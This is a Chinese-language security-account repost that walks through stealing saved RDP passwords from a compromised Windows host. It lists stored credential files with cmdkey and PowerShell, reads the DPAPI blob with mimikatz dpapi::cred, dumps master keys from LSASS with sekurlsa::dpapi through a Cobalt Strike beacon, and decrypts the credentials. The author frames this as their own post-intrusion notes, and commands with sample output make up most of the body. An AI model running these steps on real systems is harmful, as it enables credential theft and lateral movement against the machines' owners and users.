#  内网渗透 | 获取远程主机保存的RDP凭据密码

Sp4ce  [ LemonSec ](javascript:void\(0\);)

**LemonSec** ![]()

微信号 lemon-sec

功能介绍 每日发布安全资讯～

____

___发表于_

收录于合集 #网络安全 215个

拿下一台运维机，上了个CS，发现曾经连接过几台服务器并且保存了凭据，网上查了圈发现CS不支持交互式mimikatz，记录下获取远程主机RDP凭据。

  

Windows保存RDP凭据的目录是 **C:\Users\用户名\AppData\Local\Microsoft\Credentials**

  

可通过命令行获取，执行:

  * 

    
    
    cmdkey /list或powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force

  

注意: **cmdkey /list** 命令务必在Session会话下执行，system下执行无结果。

  

![]()

使用cobalt strike中的mimikatz可以获取一部分接下来要用到的masterkey和pbData  

  

  * 

    
    
    mimikatz dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID

  

输出应类似

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    **BLOB**dwVersion          : 00000001 - 1guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}dwMasterKeyVersion : 00000001 - 1guidMasterKey      : {0785cf41-0f53-4be7-bc8b-6cb33b4bb102}dwFlags            : 20000000 - 536870912 (system ; )dwDescriptionLen   : 00000012 - 18szDescription      : 本地凭据数据  
      
    algCrypt           : 00006610 - 26128 (CALG_AES_256)dwAlgCryptLen      : 00000100 - 256dwSaltLen          : 00000020 - 32pbSalt             : 726d845b8a4eba29875****10659ec2d5e210a48fdwHmacKeyLen       : 00000000 - 0pbHmackKey         : algHash            : 0000800e - 32782 (CALG_SHA_512)dwAlgHashLen       : 00000200 - 512dwHmac2KeyLen      : 00000020 - 32pbHmack2Key        : cda4760ed3fb1c7874****28973f5b5b403fe31f233dwDataLen          : 000000c0 - 192pbData             : d268f81c64a3867cd7e96d99578295ea55a47fcaad5f7dd6678989117fc565906cc5a8bfd37137171302b34611ba5****e0b94ae399f9883cf80050f0972693d72b35a9a90918a06ddwSignLen          : 00000040 - 64pbSign             : 63239d3169c99fd82404c0e230****37504cfa332bea4dca0655

  

需要关注的是guidMasterKey、pbData，pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。这里LSASS已经在其缓存中存有这个key因此我们可以使用SeDebugPrivilege获取。

  

  * 

    
    
    beacon> mimikatz !sekurlsa::dpapi  

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    mimikatz !sekurlsa::dpapi      [00000001]     * GUID      :    {0785cf41-0f53-4be7-bc8b-6cb33b4bb102}     * Time      :    2020/1/3 8:05:02     * MasterKey :    02b598c2252fa5d8f7fcd***7737644186223f44cb7d958148     * sha1(key) :    3e6dc57a0fe****a902cfaf617b1322     [00000002]     * GUID      :    {edcb491a-91d7-4d98-a714-8bc60254179f}     * Time      :    2020/1/3 8:05:02     * MasterKey :    c17a4aa87e9848e9f46c8ca81330***79381103f4137d3d97fe202     * sha1(key) :    5e1b3eb1152d3****6d3d6f90aaeb

  

然后将凭据保存到本地，执行

  

  * 

    
    
    mimikatz "dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSION /masterkey:对应的GUID key"

![]()

> 文章作者: Sp4ce
>
> 文章链接: https://0x20h.com/p/bf1f.html  
>
>
> 转自 Sp4ce's Blog！

 **侵权请私聊公众号删文**  

  **热文推荐  ** ** **

  * [蓝队应急响应姿势之Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  

  * [通过DNSLOG回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  

  * [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  

  * [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  

  * [实战|通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  

  * [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  

  * [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  

  * [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  

  * [任意账号密码重置的6种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  

  * [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  

  * [手把手教你Linux提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)

  
 ** **欢迎关注LemonSec**** **觉得不错点个 **“赞”** 、“在看“**

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

